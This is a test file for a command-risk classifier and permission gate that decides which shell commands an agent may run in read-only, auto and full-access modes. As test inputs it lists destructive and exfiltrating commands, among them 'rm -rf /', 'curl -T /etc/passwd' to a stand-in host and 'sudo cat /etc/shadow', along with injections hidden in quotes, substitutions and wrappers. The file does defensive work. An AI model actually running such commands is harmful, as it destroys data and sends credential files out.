import { describe, expect, it } from 'vitest'
import { classifyCommand, hasFileWriteRedirection, isReadOnlyAllowed } from '../src/security/command-classifier.js'
import { gateDecision } from '../src/security/permission.js'

describe('read-only allowlist', () => {
  it.each(['cat /etc/hosts', 'journalctl -u resin', 'systemctl status resin', 'hostname', 'uptime', 'free -m', 'df -h', 'ps aux', 'docker ps', 'kubectl get pods', 'tail -n 50 /var/log/resin/log0.log', 'grep -i error /var/log/resin/*.log', 'find /var/log -name "*.log" -mtime -1', 'nginx -v 2>&1', 'nginx -V 2>&1', 'java -version', 'node --version', 'python3 --version', 'openssl version', 'which nginx', 'type nginx', 'readlink -f /proc/1/exe', 'realpath /etc', 'rpm -qa', 'rpm -q nginx', 'dpkg -l | grep nginx', 'dpkg-query -W nginx', 'crictl ps', 'podman images', 'supervisorctl status', 'systemd-analyze blame', 'lsmod', 'ethtool eth0', 'ls /opt 2>/dev/null | head -20', 'tail -n 20 /var/log/a.log 2>&1', 'cat /etc/hosts >/dev/null', 'df -h 2>>/dev/null', 'ps aux 1>&2'])(
    'allows %s',
    (cmd) => {
      expect(isReadOnlyAllowed(cmd).allowed).toBe(true)
    },
  )
})

describe('read-only rejections (err on the side of blocking)', () => {
  it.each([
    'rm -rf /tmp/x',
    'mv a b',
    'cp a b',
    'chmod 777 /etc/x',
    'kill -9 1234',
    'systemctl restart resin',
    'systemctl stop resin',
    'docker stop resin',
    'docker exec -it a b',
    'kubectl delete pod x',
    'reboot',
    'shutdown -h now',
    'mount /dev/sda1 /mnt',
    'yum install httpd',
    'apt install nginx',
    'useradd bob',
    'passwd bob',
    'cat a > /etc/test.conf',
    'cat a >> /etc/test.conf',
    'echo x > /tmp/out',
    'echo x >> app.log',
    'grep -E a /etc/passwd > /tmp/x',
    'cat a >& capture.log',
    'echo x | tee /etc/x',
    'sed -i s/a/b/ file',
    'echo $(rm -rf /)',
    'echo `rm -rf /`',
    'bash -c "rm -rf /"',
    'sh -c "reboot"',
    'python -c "import os; os.system(\'rm -rf /\')"',
    'perl -e "system(\'reboot\')"',
    'sudo tail /var/log/secure',
    'find / -exec rm {} \;',
    'awk \'BEGIN{system("rm -rf /")}\' x',
  ])('blocks %s', (cmd) => {
    expect(isReadOnlyAllowed(cmd).allowed).toBe(false)
  })
})

describe('permission matrix (requirement 31)', () => {
  it('cat /etc/hosts is executed in every mode', () => {
    expect(gateDecision(classifyCommand('cat /etc/hosts').risk, 'READ_ONLY').kind).toBe('allow')
    expect(gateDecision(classifyCommand('cat /etc/hosts').risk, 'AUTO').kind).toBe('allow')
    expect(gateDecision(classifyCommand('cat /etc/hosts').risk, 'FULL_ACCESS').kind).toBe('allow')
  })

  it('systemctl restart resin: READ_ONLY deny, AUTO ask, FULL allow', () => {
    expect(gateDecision(classifyCommand('systemctl restart resin').risk, 'READ_ONLY').kind).toBe('deny')
    expect(gateDecision(classifyCommand('systemctl restart resin').risk, 'AUTO')).toMatchObject({
      kind: 'deny',
      code: 'COMMAND_APPROVAL_REQUIRED',
    })
    expect(gateDecision(classifyCommand('systemctl restart resin').risk, 'FULL_ACCESS').kind).toBe('allow')
  })

  it('rm -rf /: READ_ONLY deny, AUTO ask, FULL_ACCESS still asks', () => {
    const risk = classifyCommand('rm -rf /').risk
    expect(risk).toBe('DANGEROUS')
    expect(gateDecision(risk, 'READ_ONLY').kind).toBe('deny')
    expect(gateDecision(risk, 'AUTO')).toMatchObject({ kind: 'deny', code: 'COMMAND_APPROVAL_REQUIRED' })
    expect(gateDecision(risk, 'FULL_ACCESS')).toMatchObject({ kind: 'deny', code: 'COMMAND_APPROVAL_REQUIRED' })
  })

  it('cat a > /etc/test is rejected in READ_ONLY', () => {
    expect(isReadOnlyAllowed('cat a > /etc/test').allowed).toBe(false)
  })

  it('allows pipelines and quoted pipes (quote-aware splitting)', () => {
    expect(isReadOnlyAllowed('ps aux | grep java | awk \'{print $2}\'').allowed).toBe(true)
    expect(isReadOnlyAllowed("grep -E 'error|fail' /var/log/resin/*.log").allowed).toBe(true)
    expect(isReadOnlyAllowed('echo x | grep foo').allowed).toBe(true)
    expect(isReadOnlyAllowed('journalctl -u resin --since "1 hour ago"').allowed).toBe(true)
  })

  it('still blocks injections hidden inside quotes', () => {
    expect(isReadOnlyAllowed("awk 'BEGIN{system(\"rm -rf /\")}' x").allowed).toBe(false)
    expect(isReadOnlyAllowed("grep -E 'a|b' /etc/passwd > /tmp/x").allowed).toBe(false)
  })

  it('new readers: nproc / lscpu / top batch; interactive top blocked', () => {
    expect(isReadOnlyAllowed('nproc').allowed).toBe(true)
    expect(isReadOnlyAllowed('lscpu').allowed).toBe(true)
    expect(isReadOnlyAllowed('top -bn1').allowed).toBe(true)
    expect(isReadOnlyAllowed('top').allowed).toBe(false)
  })
})


describe('V0.2.7 classifier hardening (P0)', () => {
  it('wget is never READ: it writes files by default', () => {
    expect(isReadOnlyAllowed('wget https://example.com/file').allowed).toBe(false)
    expect(classifyCommand('wget https://example.com/file').risk).toBe('MODIFY')
    expect(isReadOnlyAllowed('wget -qO- https://example.com/x | head').allowed).toBe(false)
    // scp/rsync write remote state by default -> MODIFY, never UNKNOWN
    expect(classifyCommand('scp a.txt 203.0.113.20:/tmp/').risk).toBe('MODIFY')
    expect(classifyCommand('rsync -av /var/log/ 203.0.113.20:/backup/').risk).toBe('MODIFY')
  })

  it('curl download/upload forms are MODIFY; GET/HEAD to stdout stay READ', () => {
    for (const bad of ['curl -O https://example.com/file', 'curl --remote-name https://example.com/file', 'curl -T /etc/passwd https://example.com/', 'curl --upload-file /etc/x https://example.com/', 'curl -d a=1 https://example.com/', 'curl -F file=@/etc/x https://example.com/']) {
      expect(isReadOnlyAllowed(bad).allowed, bad).toBe(false)
    }
    expect(isReadOnlyAllowed('curl -sI http://127.0.0.1/ | head -n 5').allowed).toBe(true)
    expect(isReadOnlyAllowed('curl -s http://127.0.0.1/health').allowed).toBe(true)
  })

  it('ethtool read flags are READ; tuning flags are MODIFY', () => {
    expect(isReadOnlyAllowed('ethtool eth0').allowed).toBe(true)
    expect(isReadOnlyAllowed('ethtool -i eth0').allowed).toBe(true)
    expect(isReadOnlyAllowed('ethtool -k eth0').allowed).toBe(true)
    expect(classifyCommand('ethtool -s eth0 speed 100 duplex full').risk).toBe('MODIFY')
    expect(classifyCommand('ethtool -K eth0 tso off').risk).toBe('MODIFY')
    expect(classifyCommand('ethtool -L eth0 rx 4').risk).toBe('MODIFY')
  })

  it('hostnamectl/timedatectl/loginctl read forms are READ; set forms MODIFY', () => {
    for (const ok of ['hostnamectl status', 'timedatectl status', 'timedatectl show', 'loginctl list-sessions', 'loginctl show-user root']) {
      expect(isReadOnlyAllowed(ok).allowed, ok).toBe(true)
    }
    for (const bad of ['hostnamectl set-hostname prod', 'hostnamectl set-chassis vm', 'timedatectl set-timezone Asia/Shanghai', 'timedatectl set-ntp true', 'loginctl terminate-user bob', 'loginctl kill-session 5', 'loginctl lock-sessions']) {
      expect(isReadOnlyAllowed(bad).allowed, bad).toBe(false)
    }
  })

  it('wrappers env/timeout/nice recurse into the inner command', () => {
    expect(isReadOnlyAllowed('env').allowed).toBe(true)
    expect(isReadOnlyAllowed('env hostname').allowed).toBe(true)
    expect(isReadOnlyAllowed('env FOO=bar hostname').allowed).toBe(true)
    expect(isReadOnlyAllowed('timeout 5 hostname').allowed).toBe(true)
    expect(isReadOnlyAllowed('nice -n 10 hostname').allowed).toBe(true)
    expect(isReadOnlyAllowed('timeout 5 env hostname').allowed).toBe(true)
    expect(classifyCommand("env python3 -c \"import os; os.system('id')\" ").risk).toBe('UNKNOWN')
    // 'reboot' trips the whole-command DANGEROUS check before the wrapper path
    expect(classifyCommand('env sh -c "reboot"').risk).toBe('DANGEROUS')
    expect(classifyCommand('nice -n -5 systemctl restart nginx').risk).toBe('MODIFY')
    expect(isReadOnlyAllowed('env wget http://x/f').allowed).toBe(false)
  })
})

describe('V0.2.5 FD redirection: read vs write (P0)', () => {
  it('2>&1 / 2>/dev/null / >/dev/null are READ, not MODIFY', () => {
    for (const cmd of ['nginx -v 2>&1', 'java -version 2>&1', 'ls /opt 2>/dev/null | head -20', 'cat /etc/hosts >/dev/null', 'df -h 2>>/dev/null', 'tail -n 5 /var/log/a.log 2>&1']) {
      expect(classifyCommand(cmd).risk, cmd).toBe('READ')
    }
  })

  it('a redirect to a REAL file is still MODIFY', () => {
    for (const cmd of ['echo x > /tmp/out', 'echo x >> app.log', 'cat a > /etc/x', 'grep -E a /etc/passwd > /tmp/x', 'cat a >& capture.log', 'ls > note.txt']) {
      expect(classifyCommand(cmd).risk, cmd).toBe('MODIFY')
    }
  })

  it('hasFileWriteRedirection returns the write target, or null for FD ops', () => {
    expect(hasFileWriteRedirection('nginx -v 2>&1')).toBeNull()
    expect(hasFileWriteRedirection('ls 2>/dev/null')).toBeNull()
    expect(hasFileWriteRedirection('cat /etc/hosts >/dev/null')).toBeNull()
    expect(hasFileWriteRedirection('echo x > /tmp/out')).toBe('/tmp/out')
    expect(hasFileWriteRedirection('echo x >> app.log')).toBe('app.log')
    expect(hasFileWriteRedirection('echo x >&capture.log')).toBe('&capture.log')
    expect(hasFileWriteRedirection('echo x >& capture.log')).not.toBeNull()
  })
})

describe('P0 regression: no stateful regex in classification', () => {
  it('classifies the same command identically across 100 consecutive calls', () => {
    // A /g-flagged DANGEROUS_SYNTAX_PATTERN keeps a mutable lastIndex, so
    // .test() flips true/false depending on prior calls. The classifier must
    // be stateless: every call returns the same risk.
    for (let i = 0; i < 100; i++) {
      expect(classifyCommand('cat a > b').risk).toBe('MODIFY')
      expect(isReadOnlyAllowed('cat a > b').allowed).toBe(false)
    }
  })

  it('dangerous syntax is caught on every repeated call for several shapes', () => {
    for (let i = 0; i < 100; i++) {
      // $(...) / backticks are opaque — UNKNOWN (never claimed read-only),
      // never MODIFY; READ_ONLY still blocks and AUTO/FULL still prompt.
      expect(classifyCommand('echo $(rm -rf /)').risk).toBe('UNKNOWN')
      expect(isReadOnlyAllowed('echo \`rm -rf /\`').allowed).toBe(false)
      expect(isReadOnlyAllowed('bash -c "rm -rf /"').allowed).toBe(false)
      expect(isReadOnlyAllowed('cat a >> /etc/x').allowed).toBe(false)
      expect(isReadOnlyAllowed('hostname').allowed).toBe(true)
    }
  })
})

describe('separator handling (regression: trailing ; must not hang)', () => {
  it('a trailing semicolon terminates the segment and returns quickly', () => {
    expect(classifyCommand('find / -exec rm {} ;').risk).toBe('MODIFY')
    expect(isReadOnlyAllowed('find / -exec rm {} ;').allowed).toBe(false)
  })

  it('trailing separators of every kind terminate cleanly', () => {
    for (const cmd of ['echo a;', 'echo a &&', 'echo a ||', 'echo a |', 'ls ; ;', 'cat x; hostname;']) {
      expect(() => classifyCommand(cmd)).not.toThrow()
    }
  })

  it('semicolon separators split segments but stay read-only for readers', () => {
    expect(classifyCommand('hostname; uptime').risk).toBe('READ')
    expect(classifyCommand('hostname; uptime;').risk).toBe('READ')
  })

  it('a modifier after a trailing separator is still caught', () => {
    expect(classifyCommand('hostname; rm -rf /tmp/x').risk).toBe('MODIFY')
    expect(isReadOnlyAllowed('hostname; rm -rf /tmp/x').allowed).toBe(false)
  })
})

describe('V0.3.1 semantic registry + UNKNOWN (P0)', () => {
  it('newly recognised read-only diagnostics are READ (was MODIFY)', () => {
    const reads = [
      "sed -n '1,20p' /etc/hosts",
      "sed -n '/error/p' /var/log/app.log",
      'findmnt', 'findmnt -T /data',
      'pstree -ap', 'pmap -x 1234', 'lsns',
      'file /opt/app/app.jar', 'strings /opt/app/app.jar',
      'sha1sum /opt/app/app.jar', 'sha256sum /opt/app/app.jar', 'md5sum /opt/file', 'cksum /opt/file',
      'namei -l /opt/app/config', 'getfacl /data', 'lsattr /etc/hosts',
      'lspci', 'lsusb', 'numactl --hardware', 'numactl --show',
      'ulimit -a', 'locale -a', 'localectl status', 'localectl list-locales',
      'mount', 'mount -l', 'findmnt -o SOURCE,TARGET,FSTYPE',
      'watch -n 2 free -m', 'strace -c true'
    ]
    for (const cmd of reads) {
      expect(classifyCommand(cmd).risk, cmd).toBe('READ')
    }
  })

  it('systemctl/docker/kubectl read verbs are READ; docker compose read forms are READ', () => {
    for (const cmd of [
      'systemctl status nginx', 'systemctl show nginx', 'systemctl cat nginx',
      'systemctl list-units', 'systemctl list-unit-files', 'systemctl list-dependencies nginx',
      'systemctl is-active nginx', 'systemctl is-enabled nginx', 'systemctl is-failed nginx',
      'docker ps', 'docker top nginx', 'docker inspect nginx', 'docker stats --no-stream',
      'docker compose ps', 'docker compose logs -f --tail 50', 'docker compose config',
      'kubectl top nodes', 'kubectl events -n dev', 'kubectl explain pods',
      'kubectl cluster-info', 'kubectl api-resources', 'kubectl auth can-i create pods',
      'kubectl config view',
    ]) {
      expect(classifyCommand(cmd).risk, cmd).toBe('READ')
    }
  })

  it('mutating forms are still MODIFY / DANGEROUS (never downgraded)', () => {
    for (const cmd of [
      'systemctl restart nginx', 'systemctl stop nginx', 'systemctl reload nginx',
      'systemctl daemon-reload', 'systemctl edit nginx',
      'docker compose up -d', 'docker compose down', 'docker compose build',
      'docker start nginx', 'docker run -d nginx', 'docker network create app-net',
      'docker system prune -a', 'docker volume rm v1',
      'kubectl apply -f depl.yaml', 'kubectl delete pod x', 'kubectl rollout restart deploy/x',
      'kubectl taint node x key=value:NoSchedule', 'kubectl auth reconcile -f role.yaml',
      'kubectl config set-context prod',
      "sed -i 's/a/b/g' /etc/nginx/nginx.conf", 'sed -in s/x/y/ file', 'sed -i.bak s/a/b/ f',
      'mount /dev/sdb1 /data', 'mount -o remount,rw /',
      'tar -xzf app.tgz', 'tar -czf /tmp/backup.tgz /etc',
      'yum install httpd', 'dnf remove nginx', 'apt update', 'apt-get install -y vim',
      'setfacl -m u:root:rwx /data', 'chattr +i /etc/hosts', 'fuser -k 80/tcp',
    ]) {
      expect(classifyCommand(cmd).risk, cmd).toBe('MODIFY')
    }
    for (const cmd of ['mkfs.ext4 /dev/sdb1', 'wipefs -a /dev/sdb', 'rm -rf /*', 'shutdown -h now', 'reboot']) {
      expect(classifyCommand(cmd).risk, cmd).toBe('DANGEROUS')
    }
  })

  it('UNKNOWN is the honest class for unrecognised commands — never MODIFY', () => {
    expect(classifyCommand('vendor-cli inspect').risk).toBe('UNKNOWN')
    expect(classifyCommand('my-company-diagnose --status').risk).toBe('UNKNOWN')
    expect(classifyCommand('systemctl frobnicate nginx').risk).toBe('UNKNOWN')
    expect(classifyCommand('docker mystery-verb').risk).toBe('UNKNOWN')
    // READ_ONLY blocks UNKNOWN; AUTO and FULL_ACCESS both require approval
    expect(gateDecision('UNKNOWN', 'READ_ONLY').kind).toBe('deny')
    expect(gateDecision('UNKNOWN', 'AUTO')).toMatchObject({ kind: 'deny', code: 'COMMAND_APPROVAL_REQUIRED' })
    expect(gateDecision('UNKNOWN', 'FULL_ACCESS')).toMatchObject({ kind: 'deny', code: 'COMMAND_APPROVAL_REQUIRED' })
    // isReadOnlyAllowed stays closed for UNKNOWN
    expect(isReadOnlyAllowed('vendor-cli inspect').allowed).toBe(false)
  })

  it('wrapper regression: any wrapper depth never downgrades the inner command', () => {
    // V0.3.1 P0: these all used to sneak through the weakened readClassify path
    expect(classifyCommand('env curl -d a=1 http://server/api').risk).toBe('MODIFY')
    expect(classifyCommand('env curl -o /tmp/x http://server/f').risk).toBe('MODIFY')
    expect(classifyCommand('timeout 5 find /tmp -delete').risk).toBe('MODIFY')
    expect(classifyCommand('nice -n 5 find / -exec rm {} \\;').risk).toBe('MODIFY')
    expect(classifyCommand('nice sysctl -w vm.drop_caches=3').risk).toBe('MODIFY')
    expect(classifyCommand('timeout 5 env nice curl -d x=1 http://host/').risk).toBe('MODIFY')
    expect(classifyCommand('env timeout 3 sed -i s/a/b/ f').risk).toBe('MODIFY')
    expect(classifyCommand('env wget http://x/f').risk).toBe('MODIFY')
    expect(classifyCommand('timeout 3 env find / -delete').risk).toBe('MODIFY')
    // and never downgrade a DANGEROUS either
    expect(classifyCommand('env timeout 5 rm -rf /tmp').risk).toBe('MODIFY')
    // reads wrapped stay READ
    expect(classifyCommand('timeout 5 env nice hostname').risk).toBe('READ')
  })

  it('PRIVILEGED_READ: sudo + confirmed reader (matrix row)', () => {
    for (const cmd of ['sudo cat /etc/shadow', 'sudo ss -lntp', 'sudo journalctl -u nginx', 'sudo lsof -i', 'sudo findmnt']) {
      expect(classifyCommand(cmd).risk, cmd).toBe('PRIVILEGED_READ')
    }
    expect(gateDecision('PRIVILEGED_READ', 'READ_ONLY').kind).toBe('deny')
    expect(gateDecision('PRIVILEGED_READ', 'READ_ONLY', { privilegedReadInReadOnly: true }).kind).toBe('allow')
    expect(gateDecision('PRIVILEGED_READ', 'AUTO').kind).toBe('allow')
    expect(gateDecision('PRIVILEGED_READ', 'FULL_ACCESS').kind).toBe('allow')
    // sudo never hides a real mutation
    expect(classifyCommand('sudo systemctl restart nginx').risk).toBe('MODIFY')
    expect(classifyCommand('sudo rm -rf /tmp/x').risk).toBe('MODIFY')
  })

  it('classification carries ruleId / reason / confidence / classifierVersion', () => {
    const c = classifyCommand('systemctl status nginx')
    expect(c.risk).toBe('READ')
    expect(c.ruleId).toBe('systemctl.rule')
    expect(c.reason.length).toBeGreaterThan(0)
    expect(c.classifierVersion).toBe(2)
    expect(c.normalizedCommand).toBe('systemctl status nginx')
    const u = classifyCommand('fooctl bar')
    expect(u.ruleId).toBe('unknown.command')
    expect(u.confidence).toBe('LOW')
    const m = classifyCommand('systemctl restart nginx')
    expect(m.ruleId).toBe('mutation.verb')
  })
})